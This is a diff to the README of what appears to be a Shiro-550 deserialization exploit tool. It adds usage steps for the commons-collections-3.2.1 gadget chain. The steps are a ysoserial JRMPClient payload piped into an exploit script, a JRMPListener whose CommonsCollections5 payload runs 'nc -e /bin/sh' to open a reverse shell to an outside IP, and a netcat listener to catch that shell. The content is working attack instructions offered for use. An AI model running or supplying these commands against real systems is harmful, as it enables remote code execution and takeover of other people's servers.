@@ -2,6 +2,14 @@
 
 ![](./SHIRO-550.gif)
 
+## commons-collections-3.2.1.jar
+
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "10.10.20.166:12345" |python exp.py`
+
+`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'nc -e /bin/sh 192.168.5.86 8989'`
+
+`nc -nlvp 8989`
+
 ![](./commons-collections-3.2.1.jpg)
 
 ## python usage:
